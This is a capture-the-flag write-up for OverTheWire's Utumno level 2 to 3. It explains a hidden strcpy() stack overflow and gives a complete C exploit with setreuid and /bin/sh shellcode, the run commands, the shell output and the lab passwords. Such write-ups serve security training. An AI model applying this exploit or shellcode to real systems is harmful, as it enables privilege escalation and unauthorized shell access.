# Utumno Level 02 to 03

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Utumno |
| Level | 2 -> 3 |
| Status | Complete |

## Objective

Reach the hidden `strcpy()` path in `utumno2`, control saved EIP, and use it to spawn a shell as `utumno3`.

## Given Access

User: `utumno2`

Password:

```text
RdUzprHKSm
```

## Recon

`utumno2` prints `Aw..` and exits on normal execution, but the disassembly reveals a hidden path:

- if the program sees a null `argv` pointer shape, it skips the `puts()`/`exit()` branch,
- then it loads a pointer from further up the startup stack,
- and `strcpy()` copies that string into a 12-byte local buffer at `ebp-0xc`.

Two live checks mattered:

1. `ltrace` on a helper wrapper confirmed the active copy destination outside GDB:

```text
strcpy(0xffffddfc, "I") = 0xffffddfc
```

2. `/proc/sys/kernel/randomize_va_space` was `0`, so that stack destination stayed fixed across runs.

The offset from the start of the 12-byte buffer to saved EIP was 16 bytes.

## Method

1. Write a 32-bit helper that calls `execve("/utumno/utumno2", NULL, env)`.
2. Fill every environment slot with the same payload so it does not matter which entry the hidden stack walk actually selects.
3. Use a staged payload layout:
   - bytes `0..1`: `jmp short 0x12`
   - bytes `2..15`: filler
   - bytes `16..19`: overwritten saved return address = `0xffffddfc` (the start of the stack buffer)
   - bytes `20+`: shellcode
4. The short jump skips over the smashed saved EBP/RET area and lands in the tail shellcode after the overwritten return address.
5. The shellcode performs `setreuid(16003,16003)` and then `execve("/bin/sh")`.
6. Pipe `id`, `cat /etc/utumno_pass/utumno3`, and `exit` into the helper to harvest the password cleanly.

## Working Live Values

```text
stack buffer start: 0xffffddfc
saved EIP offset:   16
ASLR:               disabled
```

## Commands

```bash
ssh -p 2227 utumno2@utumno.labs.overthewire.org
cat > /tmp/u2exp2.c <<'EOF'
#include <unistd.h>
int main(void){
    static unsigned char payload[] = {
        0xeb,0x12,
        0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
        0xfc,0xdd,0xff,0xff,
        0x31,0xc0,0xb0,0x46,0x31,0xdb,0x66,0xbb,0x83,0x3e,0x31,0xc9,0x66,0xb9,0x83,0x3e,0xcd,0x80,
        0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x53,0x89,
        0xe1,0x31,0xd2,0xb0,0x0b,0xcd,0x80,
        0x00
    };
    char *env[11];
    for (int i = 0; i < 10; i++) env[i] = (char*)payload;
    env[10] = 0;
    execve("/utumno/utumno2", 0, env);
    return 1;
}
EOF
cd /tmp && gcc -m32 /tmp/u2exp2.c -o /tmp/u2exp2
printf 'id
cat /etc/utumno_pass/utumno3
exit
' | /tmp/u2exp2
```

## Result

Successful live output included:

```text
uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)
h3kVKJZuid
```

That password was then verified by logging in directly as `utumno3`.

## Lesson

If startup-stack layout is attacker-reachable and ASLR is off, a small staged jump can turn even a tiny local buffer into a reliable landing pad. The `jmp short` over the smashed frame data was the key simplification here.

## References

- https://overthewire.org/wargames/utumno/
